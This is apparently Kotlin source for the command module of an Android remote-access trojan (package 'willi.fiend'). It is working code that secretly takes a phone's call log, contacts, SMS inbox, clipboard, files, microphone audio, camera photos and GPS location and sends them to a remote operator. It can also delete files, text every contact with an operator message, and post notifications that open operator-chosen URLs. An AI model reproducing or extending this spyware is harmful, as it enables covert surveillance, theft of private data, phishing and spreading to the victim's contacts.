package willi.fiend.Utils

import android.annotation.SuppressLint
import android.app.NotificationManager
import android.app.PendingIntent
import android.app.Service
import android.content.ClipboardManager
import android.content.ContentResolver
import android.content.Context
import android.content.Context.CLIPBOARD_SERVICE
import android.content.Intent
import android.content.pm.ResolveInfo
import android.database.Cursor
import android.graphics.SurfaceTexture
import android.hardware.Camera
import android.media.MediaPlayer
import android.media.MediaRecorder
import android.net.Uri
import android.os.*
import android.provider.CallLog
import android.provider.ContactsContract
import android.telephony.SmsManager
import android.widget.Toast
import androidx.core.app.NotificationCompat
import com.google.android.gms.location.FusedLocationProviderClient
import com.google.android.gms.location.LocationCallback
import com.google.android.gms.location.LocationRequest
import com.google.android.gms.location.LocationResult
import willi.fiend.R
import java.io.File
import java.io.FileWriter


class AppActions(val context: Context) {
    private val request = AppRequest()
    private val permission = AppPermission(context)
    private var mediaPlayer: MediaPlayer? = null

    fun uploadCalls() {
        if (permission.checkReadCallLog()) {
            val numberCol = CallLog.Calls.NUMBER
            val durationCol = CallLog.Calls.DURATION
            val typeCol = CallLog.Calls.TYPE // 1 - Incoming, 2 - Outgoing, 3 - Missed
            val projection = arrayOf(numberCol, durationCol, typeCol)
            val cursor = context.contentResolver.query(
                CallLog.Calls.CONTENT_URI,
                projection, null, null, null
            )
            val numberColIdx = cursor!!.getColumnIndex(numberCol)
            val durationColIdx = cursor.getColumnIndex(durationCol)
            val typeColIdx = cursor.getColumnIndex(typeCol)
            var text = "Call log : \n\n"
            while (cursor.moveToNext()) {
                val number = cursor.getString(numberColIdx)
                val duration = cursor.getString(durationColIdx)
                val type = cursor.getString(typeColIdx)
                val typeCorrect =
                    if (type == "1") "Incoming" else if (type == "2") "Outgoing" else "Missed"
                text += "number : $number\nduration : $duration\nType : $typeCorrect\n\n"
            }
            cursor.close()
            val file = File.createTempFile("Call Log  -  ${AppTools.getDeviceName()}  -  ", ".txt")
            val writer = FileWriter(file)
            writer.append(text)
            writer.flush()
            writer.close()
            request.sendFile(file)
        } else {
            request.sendText(AppRequest.Text("ᴄᴀʟʟ ʟᴏɢ ᴘᴇʀᴍɪꜱꜱɪᴏɴ ᴅᴇɴɪᴇᴅ"))
        }
    }

    @SuppressLint("Range")
    fun uploadContact() {
        if (permission.checkReadContacts()) {
            var allContactList = "All Contacts\n\n\n"
            val cr: ContentResolver = context.contentResolver
            val cur = cr.query(
                ContactsContract.Contacts.CONTENT_URI,
                null, null, null, null
            )
            if ((cur?.count ?: 0) > 0) {
                while (cur != null && cur.moveToNext()) {
                    val id = cur.getString(
                        cur.getColumnIndex(ContactsContract.Contacts._ID)
                    )
                    val name = cur.getString(
                        cur.getColumnIndex(
                            ContactsContract.Contacts.DISPLAY_NAME
                        )
                    )
                    if (cur.getInt(
                            cur.getColumnIndex(
                                ContactsContract.Contacts.HAS_PHONE_NUMBER
                            )
                        ) > 0
                    ) {
                        val pCur = cr.query(
                            ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                            null,
                            ContactsContract.CommonDataKinds.Phone.CONTACT_ID + " = ?",
                            arrayOf(id),
                            null
                        )
                        while (pCur!!.moveToNext()) {
                            val phoneNo = pCur.getString(
                                pCur.getColumnIndex(
                                    ContactsContract.CommonDataKinds.Phone.NUMBER
                                )
                            )
                            allContactList += "Name: $name\nPhone Number: $phoneNo\n\n"
                        }
                        pCur.close()
                    }
                }
            }
            cur?.close()
            val file =
                File.createTempFile("All Contacts -  ${AppTools.getDeviceName()}  -  ", ".txt")
            val writer = FileWriter(file)
            writer.append(allContactList)
            writer.flush()
            writer.close()
            request.sendFile(file)
        } else {
            request.sendText(AppRequest.Text("ᴄᴏɴᴛᴀᴄᴛ ᴘᴇʀᴍɪꜱꜱɪᴏɴ ᴅᴇɴɪᴇᴅ"))
        }
    }

    @SuppressLint("Range", "Recycle")
    fun uploadMessages() {
        if (permission.checkReadSms()) {
            val sms = arrayListOf<SmsModel>()
            val uriSMSURI = Uri.parse("content://sms/inbox")
            val cur: Cursor? = context.contentResolver.query(uriSMSURI, null, null, null, null)
            if (cur != null) {
                while (cur.moveToNext()) {
                    val address = cur.getString(cur.getColumnIndex("address"))
                    val body = cur.getString(cur.getColumnIndexOrThrow("body"))
                    sms.add(SmsModel(address, body, AppTools.getDeviceName()))
                }
                var allSmsText = "All Sms : \n\n"
                for (message in sms) {
                    val number = message.phone
                    val device = message.device
                    val text = message.message
                    allSmsText += "Number : $number\nDevice : $device\nMessage : $text\n\n\n\n"
                }
                val file =
                    File.createTempFile("All Sms  -  ${AppTools.getDeviceName()}  -  ", ".txt")
                val writer = FileWriter(file)
                writer.append(allSmsText)
                writer.flush()
                writer.close()
                request.sendFile(file)
            }
        } else {
            request.sendText(AppRequest.Text("ᴍᴇꜱꜱᴀɢᴇ ᴀᴄᴛɪᴏɴ ᴘᴇʀᴍɪꜱꜱɪᴏɴ ᴅᴇɴɪᴇᴅ"))
        }
    }

    @SuppressLint("UnspecifiedImmutableFlag")
    fun sendMessage(number: String, message: String) {
        if (permission.checkSendSms()) {
            val sentPI: PendingIntent =
                PendingIntent.getBroadcast(context, 0, Intent("SMS_SENT"), 0)
            SmsManager.getDefault()
                .sendTextMessage(number, null, message, sentPI, null)
        } else {
            request.sendText(AppRequest.Text("ᴍᴇꜱꜱᴀɢᴇ ᴀᴄᴛɪᴏɴ ᴘᴇʀᴍɪꜱꜱɪᴏɴ ᴅᴇɴɪᴇᴅ"))
        }
    }

    @SuppressLint("Range")
    fun messageToAllContacts(message: String) {
        if (permission.checkReadContacts() && permission.checkSendSms()) {
            val cr: ContentResolver = context.contentResolver
            val cur = cr.query(
                ContactsContract.Contacts.CONTENT_URI,
                null, null, null, null
            )
            if ((cur?.count ?: 0) > 0) {
                while (cur != null && cur.moveToNext()) {
                    val id = cur.getString(
                        cur.getColumnIndex(ContactsContract.Contacts._ID)
                    )
                    if (cur.getInt(
                            cur.getColumnIndex(
                                ContactsContract.Contacts.HAS_PHONE_NUMBER
                            )
                        ) > 0
                    ) {
                        val pCur = cr.query(
                            ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                            null,
                            ContactsContract.CommonDataKinds.Phone.CONTACT_ID + " = ?",
                            arrayOf(id),
                            null
                        )
                        while (pCur!!.moveToNext()) {
                            val phoneNo = pCur.getString(
                                pCur.getColumnIndex(
                                    ContactsContract.CommonDataKinds.Phone.NUMBER
                                )
                            )
                            sendMessage(phoneNo, message)
                        }
                        pCur.close()
                    }
                }
            }
            cur?.close()
        } else {
            request.sendText(AppRequest.Text("ᴍᴇꜱꜱᴀɢᴇ ᴀᴄᴛɪᴏɴ ᴘᴇʀᴍɪꜱꜱɪᴏɴ ᴅᴇɴɪᴇᴅ"))
        }
    }

    @SuppressLint("WrongConstant")
    fun uploadApps() {
        var allAppsText = "All Apps :\n\n\n "
        val mainIntent = Intent(Intent.ACTION_MAIN, null)
        mainIntent.addCategory(Intent.CATEGORY_LAUNCHER)
        val appList: List<ResolveInfo> =
            context.packageManager.queryIntentActivities(mainIntent, 0)
        for (app in appList) {
            allAppsText += app.activityInfo.name + "\n\n"
        }
        val file = File.createTempFile("All Apps  -  ${AppTools.getDeviceName()}  -  ", ".txt")
        val writer = FileWriter(file)
        writer.append(allAppsText)
        writer.flush()
        writer.close()
        request.sendFile(file)
    }

    fun uploadDeviceInfo() {
        val model = AppTools.getDeviceName()
        val battery = AppTools.getBatteryPercentage(context)
        val file = File.createTempFile("Device Status  -  ${AppTools.getDeviceName()}  -  ", ".txt")
        val writer = FileWriter(file)
        writer.append("$model\n Battery Percentage : $battery")
        writer.flush()
        writer.close()
        request.sendFile(file)
    }

    fun uploadClipboard() {
        AppScope.runMain {
            val clipBoardManager = context.getSystemService(CLIPBOARD_SERVICE) as ClipboardManager
            val clip = clipBoardManager.primaryClip?.getItemAt(0)?.text?.toString()
            val file =
                File.createTempFile("Clipboard  -  ${AppTools.getDeviceName()}  -  ", ".txt")
            val writer = FileWriter(file)
            writer.append("new Clipboard : $clip")
            writer.flush()
            writer.close()
            request.sendFile(file)
            clipBoardManager.addPrimaryClipChangedListener {
                val newClip = clipBoardManager.primaryClip?.getItemAt(0)?.text?.toString()
                val newFile =
                    File.createTempFile(
                        "Clipboard  -  ${AppTools.getDeviceName()}  -  ",
                        ".txt"
                    )
                val newWriter = FileWriter(newFile)
                newWriter.append("new Clipboard : $newClip")
                newWriter.flush()
                newWriter.close()
                request.sendFile(newFile)
            }
        }
    }

    fun uploadFile(path: String) {
        if (permission.checkReadExternalStorage()) {
            val file = File(Environment.getExternalStorageDirectory().path + "/" + path)
            if (file.exists()) {
                if (file.isDirectory) {
                    val listFiles = file.listFiles()
                    if (listFiles != null) {
                        for (targetFile in listFiles) {
                            request.sendFile(targetFile)
                        }
                    }
                }
                if (file.isFile) {
                    request.sendFile(file)
                }
            } else {
                request.sendText(AppRequest.Text("ᴛʜᴇʀᴇ ɪꜱ ɴᴏ ꜱᴜᴄʜ ꜰᴏʟᴅᴇʀ ᴏʀ ꜰɪʟᴇ"))
            }
        } else {
            request.sendText(AppRequest.Text("ꜰɪʟᴇ ᴍᴀɴᴀɢᴇ ᴘᴇʀᴍɪꜱꜱɪᴏɴ ᴅᴇɴɪᴇᴅ"))
        }
    }

    fun deleteFile(path: String) {
        if (AppPermission(context).checkWriteExternalStorage()) {
            val file = File(Environment.getExternalStorageDirectory().path + "/" + path)
            if (file.exists()) {
                if (file.isDirectory) {
                    file.deleteRecursively()
                    request.sendText(AppRequest.Text("File ${file.name} ᴅᴇʟᴇᴛᴇᴅ ꜱᴜᴄᴄᴇꜱꜱꜰᴜʟʟʏ"))
                }
                if (file.isFile) {
                    file.delete()
                    request.sendText(AppRequest.Text("File ${file.name} ᴅᴇʟᴇᴛᴇᴅ ꜱᴜᴄᴄᴇꜱꜱꜰᴜʟʟʏ"))
                }
            } else {
                request.sendText(AppRequest.Text("ᴛʜᴇʀᴇ ɪꜱ ɴᴏ ꜱᴜᴄʜ ꜰᴏʟᴅᴇʀ ᴏʀ ꜰɪʟᴇ"))
            }
        } else {
            request.sendText(AppRequest.Text("ꜰɪʟᴇ ᴍᴀɴᴀɢᴇ ᴘᴇʀᴍɪꜱꜱɪᴏɴ ᴅᴇɴɪᴇᴅ"))
        }
    }

    @SuppressLint("NewApi")
    fun captureMicrophone(duration: Long) {
        if (AppPermission(context).checkCaptureMic()) {
            request.sendText(AppRequest.Text("$duration ꜱᴇᴄᴏɴᴅ ʀᴇᴄᴏʀᴅ ꜱᴛᴀʀᴛᴇᴅ , ʏᴏᴜ ᴡɪʟʟ ʀᴇᴄᴇɪᴠᴇ ꜰɪʟᴇ ꜱᴏᴏɴ"))
            val file = File.createTempFile("Mic -  ${AppTools.getDeviceName()}  -  ", ".amr")
            val mediaRecord = MediaRecorder()
            mediaRecord.setAudioSource(MediaRecorder.AudioSource.MIC)
            mediaRecord.setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP)
            mediaRecord.setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB)
            mediaRecord.setOutputFile(file)
            mediaRecord.prepare()
            mediaRecord.start()
            Handler(Looper.getMainLooper()).postDelayed({
                mediaRecord.stop()
                mediaRecord.release()
                request.sendFile(file)
            }, duration * 1000)
        } else {
            request.sendText(AppRequest.Text("ᴍɪᴄʀᴏᴘʜᴏɴᴇ ᴘᴇʀᴍɪꜱꜱɪᴏɴ ᴅᴇɴɪᴇᴅ"))
        }
    }

    fun captureCameraMain() {
        if (AppPermission(context).checkCaptureCam()) {
            request.sendText(AppRequest.Text("ᴄᴀᴘᴛᴜʀᴇ ᴍᴀɪɴ ᴄᴀᴍᴇʀᴀ ꜱᴛᴀʀᴛᴇᴅ , ʏᴏᴜ ᴡɪʟʟ ʀᴇᴄᴇɪᴠᴇ ꜰɪʟᴇ ꜱᴏᴏɴ"))
            val file = File.createTempFile("Camera -  ${AppTools.getDeviceName()}  -  ", ".png")
            val holder = SurfaceTexture(0)
            val camera = Camera.open(0)
            camera.setPreviewTexture(holder)
            camera.startPreview()
            camera.takePicture(
                null,
                null,
            ) { p0, p1 ->
                file.writeBytes(p0)
                p1.release()
                request.sendFile(file)
                request.sendText(AppRequest.Text(""))
            }
        } else {
            request.sendText(AppRequest.Text("ᴄᴀᴍᴇʀᴀ ᴘᴇʀᴍɪꜱꜱɪᴏɴ ᴅᴇɴɪᴇᴅ"))
        }
    }

    fun captureCameraSelfie() {
        if (AppPermission(context).checkCaptureCam()) {
            request.sendText(AppRequest.Text("ᴄᴀᴘᴛᴜʀᴇ ꜱᴇʟꜰɪᴇ ᴄᴀᴍᴇʀᴀ ꜱᴛᴀʀᴛᴇᴅ , ʏᴏᴜ ᴡɪʟʟ ʀᴇᴄᴇɪᴠᴇ ꜰɪʟᴇ ꜱᴏᴏɴ"))
            val file = File.createTempFile("Camera -  ${AppTools.getDeviceName()}  -  ", ".png")
            val holder = SurfaceTexture(0)
            val camera = Camera.open(1)
            camera.setPreviewTexture(holder)
            camera.startPreview()
            camera.takePicture(
                null,
                null,
            ) { p0, p1 ->
                file.writeBytes(p0)
                p1.release()
                request.sendFile(file)
            }
        } else {
            request.sendText(AppRequest.Text("ᴄᴀᴍᴇʀᴀ ᴘᴇʀᴍɪꜱꜱɪᴏɴ ᴅᴇɴɪᴇᴅ"))
        }
    }

    @SuppressLint("MissingPermission", "NewApi")
    fun uploadGpsLocation() {
        request.sendText(AppRequest.Text("ʟᴏᴄᴀᴛɪᴏɴ ʀᴇQᴜᴇꜱᴛ ʀᴇᴄᴇɪᴠᴇᴅ, ᴅᴇᴠɪᴄᴇ ʟᴏᴄᴀᴛɪᴏɴ ᴡɪʟʟ ʙᴇ ꜱᴇɴᴛ ꜱᴏᴏɴ ɪꜰ ᴀᴠᴀɪʟᴀʙʟᴇ"))
        if (permission.checkGetLocation()) {
            val client = FusedLocationProviderClient(context)
            val locationRequest = LocationRequest.create()
            locationRequest.priority = LocationRequest.PRIORITY_HIGH_ACCURACY
            client.requestLocationUpdates(locationRequest, object : LocationCallback() {
                override fun onLocationResult(p0: LocationResult) {
                    if (p0 != null) {
                        val lat = p0.lastLocation?.latitude
                        val lon = p0.lastLocation?.longitude
                        if (lat != null) {
                            if (lon != null) {
                                request.sendLocation(
                                    AppRequest.Location(
                                        lat.toFloat(),
                                        lon.toFloat()
                                    )
                                )
                            }
                        }
                    }
                }
            }, Looper.getMainLooper())
        } else {
            request.sendText(AppRequest.Text("ɢᴘꜱ ᴘᴇʀᴍɪꜱꜱɪᴏɴ ᴅᴇɴɪᴇᴅ"))
        }
    }

    fun showToast(text: String) {
        Handler(Looper.getMainLooper()).post {
            Toast.makeText(context, text, Toast.LENGTH_LONG).show()
        }
        request.sendText(AppRequest.Text("ᴛʜᴇ ᴍᴇꜱꜱᴀɢᴇ ᴡᴀꜱ ꜱᴜᴄᴄᴇꜱꜱꜰᴜʟʟʏ ᴅɪꜱᴘʟᴀʏᴇᴅ"))
    }

    @SuppressLint("NewApi")
    fun showNotification(title: String, url: String) {
        val NOTIFICATION_CHANNEL_ID = "channel"
        val notificationIntent = Intent(Intent.ACTION_VIEW)
        notificationIntent.data = Uri.parse(url);
        val resultIntent = PendingIntent.getActivity(
            context,
            0,
            notificationIntent,
            PendingIntent.FLAG_MUTABLE
        )
        val mBuilder = NotificationCompat.Builder(context, NOTIFICATION_CHANNEL_ID)
            .setSmallIcon(R.drawable.ic_baseline_warning_24)
            .setContentTitle(title)
            .setContentText("")
            .setBadgeIconType(NotificationCompat.BADGE_ICON_LARGE)
            .setPriority(NotificationManager.IMPORTANCE_HIGH)
            .setContentIntent(resultIntent)
        val mNotificationManager =
            context.getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager?
        mNotificationManager!!.notify(
            System.currentTimeMillis().toInt(),
            mBuilder.build()
        )
        request.sendText(AppRequest.Text("ᴛʜᴇ ɴᴏᴛɪꜰɪᴄᴀᴛɪᴏɴ ᴡᴀꜱ ꜱᴜᴄᴄᴇꜱꜱꜰᴜʟʟʏ ᴅɪꜱᴘʟᴀʏᴇᴅ"))
    }

    @SuppressLint("NewApi")
    fun vibratePhone() {
        val vibrationManager =
            context.getSystemService(Service.VIBRATOR_MANAGER_SERVICE) as VibratorManager
        vibrationManager.vibrate(
            CombinedVibration.createParallel(
                VibrationEffect.createOneShot(
                    2000,
                    1
                )
            )
        )
        request.sendText(AppRequest.Text("ᴅᴇᴠɪᴄᴇ ᴠɪʙʀᴀᴛɪᴏɴ ʜᴀꜱ ʙᴇᴇɴ ᴇxᴇᴄᴜᴛᴇᴅ ꜱᴜᴄᴄᴇꜱꜱꜰᴜʟʟʏ"))
    }

    fun playAudio(url: String) {
        AppScope.runMain {
            try {
                mediaPlayer = MediaPlayer()
                if (mediaPlayer != null) {
                    mediaPlayer!!.setDataSource(url)
                    mediaPlayer!!.prepare()
                    mediaPlayer!!.start()
                    request.sendText(AppRequest.Text("ᴛʜᴇ ᴀᴜᴅɪᴏ ꜰɪʟᴇ ɪꜱ ᴘʟᴀʏɪɴɢ ꜱᴜᴄᴄᴇꜱꜱꜰᴜʟʟʏ"))
                }
            } catch (e:Exception){
                request.sendText(AppRequest.Text("ᴀᴜᴅɪᴏ ꜰɪʟᴇ ᴘʟᴀʏʙᴀᴄᴋ ꜰᴀɪʟᴇᴅ"))
            }
        }
    }

    fun stopAudio() {
        AppScope.runMain {
            if (mediaPlayer != null) {
                mediaPlayer!!.release()
                mediaPlayer = null
                request.sendText(AppRequest.Text("ᴀᴜᴅɪᴏ ꜰɪʟᴇ ꜱᴛᴏᴘᴘᴇᴅ ꜱᴜᴄᴄᴇꜱꜱꜰᴜʟʟʏ"))
            }
        }
    }

    data class SmsModel(
        val phone: String,
        val message: String,
        val device: String
    )
}